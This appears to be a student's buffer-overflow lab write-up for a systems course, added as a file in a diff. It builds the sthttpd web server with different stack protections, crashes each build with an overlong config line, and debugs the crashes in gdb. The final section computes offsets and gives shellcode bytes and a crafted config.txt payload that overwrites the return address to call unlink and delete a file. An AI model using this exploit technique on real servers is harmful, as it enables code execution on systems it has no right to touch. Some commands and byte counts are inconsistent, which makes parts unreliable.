@@ -1,0 +1,234 @@
+George Archbold
+604407413
+
+I started the lab by downloading the tar file and uploading it to the linux server:
+1)scp sthttpd­2.27.0.tar.gz  archbold@lnxsrv.seas.ucla.edu:~
+
+I then logged into the linux server:
+2) ssh archbold@lnxsrv09.seas.ucla.edu 
+
+I created a new folder and unzipped the file:
+ 
+3) tar ­-xvzf sthttpd­-2.27.0.tar.gz
+4) mv sthttpd­-2.27.0 CS33
+5) cd CS33/sthttpd­-2.27.0
+6)./configure \LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+Then I made the patch to sthttpd by going into the file and changeing the two lines manually:
+7) emacs src/thttpd.c
+
+I then compiled the sthttpd file with each of the specified flags:
+
+1) make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+2) mv src/thttpd src/thttpd-sp
+3) make clean
+
+4) make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+5) mv src/thttpd src/thttpd-as
+6) make clean
+
+7) make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+8) mv src/thttpd src/thttpd-no
+9) make clean
+
+
+This created three executables each compiled with respective flags. I did have some trouble here however. It took me a while to realize(find it on piazza) that for the the AS that I needed the -static-libasan line. I also was using the wrong version of gcc so I had to also input that path.
+
+I tested if the servers were working using the curl command and they worked as expected. 
+
+5.---SP---
+
+It took me a while to figure out what to make my config file. At first I tried writing just a bunch of option words, the realized I just needed to load more than 100 char values to crash the program.
+
+So I made it config.txt="max_age=sdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdaasdfasdfasdfasdfasdfasdfsadfasdfasdfasdfasdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdaasdfasdfasdfasdfasdfasdfsadfasdfasdfasdfaortsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsd"
+
+I then ran the executable to see if it crashed:
+
+1) src/thttpd-sp -p 13153 -D -C config.txt 
+This returned a segmentation fault so then I went into gdb, used the backtrace, and found where it happens
+
+2) gdb --args src/thttpd-sp -p 13153 -D -C config.txt
+3) bt
+This told me that the crash occured at line 1190 of the code, so I set a breakpoint two lines before it and ran the debugger
+
+	0x0000000000404bfe <read_config+1182>:	4c 89 e7	mov    %r12,%rdi
+=> 0x0000000000404c01 <read_config+1185>:	e8 0a d5 ff ff	callq  0x402110 <fclose@plt>
+
+The error occurs when it calls fclose.
+
+0x0000000000404c14	1190	    }
+   0x0000000000404c06 <read_config+1190>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+   0x0000000000404c0b <read_config+1195>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+=> 0x0000000000404c14 <read_config+1204>:	0f 85 94 00 00 00	jne    0x404cae <read_config+1358>
+   0x0000000000404c1a <read_config+1210>:	48 83 c4 78	add    $0x78,%rsp
+   0x0000000000404c1e <read_config+1214>:	5b	pop    %rbx
+   0x0000000000404c1f <read_config+1215>:	5d	pop    %rbp
+   0x0000000000404c20 <read_config+1216>:	41 5c	pop    %r12
+   0x0000000000404c22 <read_config+1218>:	41 5d	pop    %r13
+   0x0000000000404c24 <read_config+1220>:	c3	retq   
+
+
+The error occurs in the xor line because its checking for canary and if they're not equal then it triggers the jump.
+
+6.---AS---
+
+
+
+config.txt="max_age=sdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdaasdfasdfasdfasdfasdfasdfsadfasdfasdfasdfasdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdaasdfasdfasdfasdfasdfasdfsadfasdfasdfasdfaortsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsd"
+
+I then ran the executable to see if it crashed:
+
+1) src/thttpd-as -p 13154 -D -C config.txt 
+This returned a different error then the other two cases:
+
+=================================================================
+==44541==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcde4 at pc 0x00000045a418 bp 0x7fffffffcd40 sp 0x7fffffffc4f0
+READ of size 268 at 0x7fffffffcde4 thread T0
+
+So I continued on and
+
+2) gdb --args src/thttpd-sp -p 13154 -D -C config.txt
+3) bt
+This told me that the crash occured at line 1018 of the code, so I set a breakpoint two lines before it and ran the debugger
+
+(gdb) si
+0x00000000004b1dfc	1018		if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+   0x00000000004b1df3 <read_config+179>:	48 8b 3c 24	mov    (%rsp),%rdi
+   0x00000000004b1df7 <read_config+183>:	be 23 00 00 00	mov    $0x23,%esi
+=> 0x00000000004b1dfc <read_config+188>:	e8 3f 85 fa ff	callq  0x45a340 <__interceptor_strchr(char const*, int)>
+   0x00000000004b1e01 <read_config+193>:	48 85 c0	test   %rax,%rax
+   0x00000000004b1e04 <read_config+196>:	74 24	je     0x4b1e2a <read_config+234>
+
+   The error statement clearly describes it as a stack overflow. This function call is where it occurs.
+
+
+7.---NO---
+
+
+
+config.txt="max_age=sdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdaasdfasdfasdfasdfasdfasdfsadfasdfasdfasdfasdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdaasdfasdfasdfasdfasdfasdfsadfasdfasdfasdfaortsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsd"
+
+I then ran the executable to see if it crashed:
+
+1) src/thttpd-as -p 13155 -D -C config.txt 
+This returned a segmentation fault so then I went into gdb, used the backtrace, and found where it happens
+
+2) gdb --args src/thttpd-no -p 13155 -D -C config.txt
+3) bt
+This told me that the crash occured at line 1190 of the code, so I set a breakpoint two lines before it and ran the debugger
+
+
+
+0x0000000000404a80	1190	    }
+   0x0000000000404a76 <read_config+1174>:	48 83 c4 78	add    $0x78,%rsp
+   0x0000000000404a7a <read_config+1178>:	5b	pop    %rbx
+   0x0000000000404a7b <read_config+1179>:	5d	pop    %rbp
+   0x0000000000404a7c <read_config+1180>:	41 5c	pop    %r12
+   0x0000000000404a7e <read_config+1182>:	41 5d	pop    %r13
+=> 0x0000000000404a80 <read_config+1184>:	c3	retq   
+
+At this return statement the actual value is over written with junk from the config file, and therefore is unable to return the proper value causing a program crash.
+
+
+8. 
+
+After compiling the assembly code for each file I got three -S files:
+
+gcc -S -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
+gcc -S -fno-inline -fsanitize=address -I .. -I . thttpd.c -o thttpd-sp.s
+gcc -S -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-sp.s
+
+The only noticeable difference between SP and NO was that SP only incremented the base pointer by 8 bits in comparison to the 16 bit incrementation of NO.
+
+AS uses more memory than the other two methods because it stores checked memory in shadow memory. If the buffer reaches any shadow memory, that is outside of the buffer,directly then it returns an error. The stack protection in this case doesn't do anything because normally it detects high risk functions, but detected no risk in handle_read and therefor did nothing.
+
+
+
+
+
+9.
+
+First I had to find the number of bytes needed in config.txt before the ret value:
+
+
+commands:
+gdb --args src/thttpd-no -p 13155 -D -C config.txt
+break read_config
+run
+info registers rsp
+
+%rsp=0x7fffffffcf08
+This gives the stack pointer register value at the beginning of the stack buffer
+
+commands:
+break 1189
+run
+info registers rsp
+
+%rsp=0x7fffffffce70
+This gives the stack pointer register value at the beginning of the stack buffer
+
+Subtracting the two gives 152 bytes, which gives the number of chars we have to write in config.txt to get to the ret value
+
+By googling x86-64 I found that syscall deals with the value of %rax and we want it to be 87 to implement the unlink function, and unlink deletes the value found %rdi:
+disassemble /r unlink
+
+
+move $87, %rax
+syscall
+
+
+Since I made "target.txt" 
+I made a test.s file to find the machine code to move the address of "target.txt" text into rdi. I moved the value of the beginning %rsp, as I loaded target.txt into the beginning of the buffer.
+
+
+The value of the beginning of the buffer(address for target.txt) right before all the last values are popped of is:
+0x7fffffffce90 +5 (after port=)
+I made a file test1.s:
+mov $0x7fffffffce95, %rdi
+
+gcc -c test.o
+address of target    = 7fffffffce90 + 5
+               = 7f ff ff ff ce 95
+               = 00 00 7f ff ff ff ce 95
+               = 95 ce ff ff ff 7f 00 00 (reversed)
+
+
+target.txt/0 	 	= 74 61 72 67 65 74 2e 74 78 74 0a
+
+
+move 87 -> rax      = b8 57 00 00 00
+
+address to jump to  = 0x7fffffffcf30 +8
+					     = 00 00 7f ff ff ff cf 38
+					     = 38 cf ff ff ff 7f 00 00 (reveresed)
+
+bit config for tar to rdi = 48 bf 94 ce ff ff ff 7f
+
+syscall = 00 00 0f 05
+
+I put all these bit configurations in order into Uen-Tao's hex2raw converter (only switching the couplets of the adresses), and then filled in the rest of the file with regular text.
+
+
+This whole project was basically finding the correct sequence of characters and symbols that would deliver the desired code to the buffer in order for it to perform the desired crash.
+After multiple attempts, I came up with this as my config.txt file:
+
+"port=target.txt^@fsddfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdaasdfasdfa\
+sdfasdfasdfasdfsadfasdfasdfasdfasdsdfasfasdfasdfasdfasdfasdfasdfas112345688\317\
+\377\377\377^?^@^@12345678\270W^@^@^@H\277\225\316\377\377\377^?^@^@^O^E"
+
+The raw text is counted differently than regular char values so that why it may appear like too many chars.
+
+In order that txt file translates to a buffer error that pushes a different address into the return value which jumps 8 bytes later to the raw text that executes the move into rax, the move into rdi and the execution of syscall to delete the target.txt file. The port= is what allows sthttpd to use the conifg file and then the rest is what is used to delete the target.txt file. This lab was quite difficult but in the end it was also quite fun and rewarding. It really opened my eyes to the level of complexity involved in the world of cyber security.
+
+
+
+
+
+
+
+
+
+
+
+
